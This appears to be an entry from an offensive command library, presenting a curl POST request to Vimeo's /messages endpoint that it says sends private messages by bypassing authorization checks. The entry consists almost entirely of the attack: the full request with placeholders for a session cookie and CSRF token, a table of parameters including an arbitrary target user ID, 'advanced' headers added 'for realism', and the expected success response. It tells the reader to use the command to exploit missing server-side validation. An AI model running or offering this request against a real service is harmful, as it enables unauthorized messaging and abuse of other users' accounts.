---
id: cmd-vimeo-post-001
data: >-
  curl -X POST https://vimeo.com/messages -H "User-Agent: Mozilla/5.0 (Windows
  NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0" -H "Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H
  "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate" -H
  "Content-Type: application/x-www-form-urlencoded; charset=utf-8" -H "Referer:
  https://vimeo.com/messages" -H "Cookie: [YOUR_SESSION_COOKIE]" -d
  "name=Jens>&text=blaat&action=send_message&lightbox=true&user=12345&token=[YOUR_CSRF_TOKEN]"
tags:
  - auth-bypass
  - http-post
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:58.808Z'
verified: false
validated: true
submitted: true
---
# vimeo-send-unauthorized-message-post

## Command

```bash
curl -X POST https://vimeo.com/messages \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Accept-Encoding: gzip, deflate" \
  -H "Content-Type: application/x-www-form-urlencoded; charset=utf-8" \
  -H "Referer: https://vimeo.com/messages" \
  -H "Cookie: [YOUR_SESSION_COOKIE]" \
  -d "name=Jens>&text=blaat&action=send_message&lightbox=true&user=12345&token=[YOUR_CSRF_TOKEN]"
```

## Description

This command sends a private message to a Vimeo user via a direct POST request, bypassing authorization checks. Use it to exploit the lack of server-side validation on the /messages endpoint.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `name` | Sender name in form data (e.g., 'Jens>') | Yes |
| `text` | Message content (e.g., 'blaat') | Yes |
| `action` | Set to 'send_message' | Yes |
| `lightbox` | Set to 'true' | Yes |
| `user` | Target user ID (arbitrary) | Yes |
| `token` | CSRF or session token | Yes |
| `-H "Cookie: ..."` | Authenticated session cookie | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://vimeo.com/messages -H "Cookie: [COOKIE]" -d "name=Test&text=Hello&action=send_message&lightbox=true&user=12345&token=[TOKEN]"
```

### Advanced Usage

Include full headers for realism:

```bash
curl -X POST https://vimeo.com/messages \
  -H "User-Agent: Mozilla/5.0 ..." \
  -H "Cookie: [COOKIE]" \
  -d "name=Jens>&text=blaat&action=send_message&lightbox=true&user=12345&token=[TOKEN]"
```

## Expected Output

HTTP 200 OK response with HTML or redirect indicating successful message send, e.g., "Message sent" in body. No errors if bypass succeeds.

## Related

- [[procedures/Bypass-Vimeo-Messaging-Authorization-with-POST-Request]]
